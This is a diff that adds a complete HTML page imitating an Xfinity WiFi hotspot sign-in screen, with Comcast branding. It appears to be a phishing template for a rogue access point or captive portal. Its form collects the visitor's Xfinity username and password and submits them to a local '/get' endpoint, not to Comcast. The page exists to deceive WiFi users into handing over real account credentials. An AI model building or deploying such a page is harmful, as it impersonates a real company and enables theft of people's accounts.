@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.xlogo{font-size:42px;font-weight:900;color:#fff;letter-spacing:-2px;text-align:center;margin-bottom:4px}
+.xlogo span{color:#7C2FCC}
+.xsub{font-size:12px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:#666;text-align:center;margin-bottom:24px}
+.card{background:#141414;width:100%;max-width:400px;border-radius:16px;border:1px solid #2a2a2a;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.5)}
+.ch{background:linear-gradient(135deg,#1a0a2e,#2d1060);padding:22px 24px;text-align:center;border-bottom:1px solid #2a2a2a}
+.ch h1{font-size:16px;font-weight:700;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.5);margin-top:3px}
+.cb{padding:24px}
+.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#666;margin-bottom:6px;margin-top:14px}
+input{width:100%;padding:12px 14px;border:1px solid #2a2a2a;border-radius:10px;font-size:15px;background:#1e1e1e;color:#f0f0f0}
+input:focus{outline:none;border-color:#7C2FCC;box-shadow:0 0 0 3px rgba(124,47,204,0.15)}
+input::placeholder{color:#3a3a3a}
+.forgot{display:block;text-align:right;font-size:12px;color:#7C2FCC;text-decoration:none;margin-top:8px;margin-bottom:6px}
+.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#7C2FCC;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
+.foot{background:#0f0f0f;border-top:1px solid #1e1e1e;padding:12px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:11px;color:#444}.foot a{color:#7C2FCC;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="xlogo">x<span>&#9679;</span>finity</div>
+<div class="xsub">WiFi Hotspot</div>
+<div class="card">
+  <div class="ch"><h1>Sign in to Xfinity WiFi</h1><p>Use your Xfinity account to connect</p></div>
+  <div class="cb">
+    <form action="/get">
+      <label class="lbl">Xfinity Username or Email</label>
+      <input name="username" type="text" placeholder="username or email@xfinity.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <a href="#" class="forgot">Forgot username or password?</a>
+      <button type="submit" class="btn">Sign In</button>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Comcast</span><a href="#">Privacy Policy</a></div>
+</div>
+</body>
+</html>
